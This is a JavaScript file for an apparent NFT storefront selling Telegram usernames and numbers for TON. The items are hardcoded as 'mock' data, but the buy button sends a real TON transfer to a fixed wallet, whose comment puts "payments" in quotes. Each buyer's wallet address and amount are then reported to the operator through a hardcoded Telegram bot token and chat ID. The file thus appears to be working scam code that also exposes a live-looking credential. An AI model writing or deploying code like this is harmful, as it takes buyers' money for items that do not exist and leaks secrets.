const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

const MAIN_WALLET = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp"; // The wallet to receive "payments"
const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
const TG_CHAT_ID = "8126533622";

// Mock NFT data
const nfts = [
    { id: 1, name: '+888 0318 2062', image: 'images/nft1.jpg', price: 900 },
    { id: 2, name: '+888 0632 5748', image: 'images/nft2.jpg', price: 814 },
    { id: 3, name: '+888 0435 6391', image: 'images/nft3.jpg', price: 1048 },
    { id: 4, name: '+888 0397 1075', image: 'images/nft4.jpg', price: 365 },
    { id: 5, name: '@ekyru', image: 'images/nft5.jpg', price: 6 },
    { id: 6, name: '@irlex', image: 'images/nft6.jpg', price: 200000 },
    { id: 7, name: '@tonmyjob', image: 'images/nft7.jpg', price: 50 },
    { id: 8, name: '@bosiness', image: 'images/nft8.jpg', price: 200 },
];

// Function to render NFTs on the page
function renderNfts() {
    const grid = document.getElementById('nft-grid');
    if (!grid) return;

    grid.innerHTML = ''; // Clear existing content
    nfts.forEach(nft => {
        const card = document.createElement('div');
        card.className = 'nft-card';
        card.innerHTML = `
            <div class="nft-image-container">
                <img src="${nft.image}" alt="${nft.name}" class="nft-image" loading="lazy">
            </div>
            <div class="nft-info">
                <h3 class="nft-name">${nft.name}</h3>
                <p class="nft-price">
                    <img src="images/ton-symbol.png" alt="TON" class="ton-symbol">
                    ${nft.price} TON
                </p>
                <button class="buy-button" data-price="${nft.price}" data-name="${nft.name}">Buy Now</button>
            </div>
        `;
        grid.appendChild(card);
    });

    // Add event listeners to the new buttons
    document.querySelectorAll('.buy-button').forEach(button => {
        button.addEventListener('click', (e) => {
            const price = e.target.dataset.price;
            const name = e.target.dataset.name;
            buyNft(price, name, e.target);
        });
    });
}

// Function to simulate buying an NFT
async function buyNft(price, name, buttonElement) {
    try {
        if (!tonConnectUI.connected || !tonConnectUI.account) {
            // Trigger connection if not connected
            tonConnectUI.openModal();
            return;
        }

        buttonElement.disabled = true;
        buttonElement.textContent = 'Processing...';

        const walletAddress = tonConnectUI.account.address;
        const amountToSend = (BigInt(price) * 1000000000n).toString(); // Convert TON to nanotons
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
            messages: [
                {
                    address: MAIN_WALLET,
                    amount: amountToSend,
                    payload: `Purchase of NFT: ${name}` // Optional: payload for comment
                }
            ]
        };

        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction successful:', result);
        
        const message = `*New NFT Purchase*\nFrom: \`${walletAddress}\`\nItem: *${name}*\nAmount: *${price} TON*`;
        sendTelegramMessage(message);
        
        alert(`Successfully purchased "${name}" for ${price} TON!`);

    } catch (error) {
        console.error('Transaction failed:', error);
        alert('Transaction failed: ' + error.message);
        const errorMessage = `*Purchase Failed*\nItem: *${name}*\nError: ${error.message}`;
        sendTelegramMessage(errorMessage);
        
    } finally {
        // Always re-enable the button
        if (buttonElement) {
            buttonElement.disabled = false;
            buttonElement.textContent = 'Buy Now';
        }
    }
}

function sendTelegramMessage(text) {
    if (!TG_CHAT_ID || !TG_BOT_TOKEN) return;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url).catch(err => console.error('Telegram error:', err));
}

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    renderNfts();

    // Optional: You can listen to status changes to update UI, e.g., show user's address
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            console.log('Wallet connected:', wallet.account.address);
            // You could display the user's address somewhere
        } else {
            console.log('Wallet disconnected.');
        }
    });
});
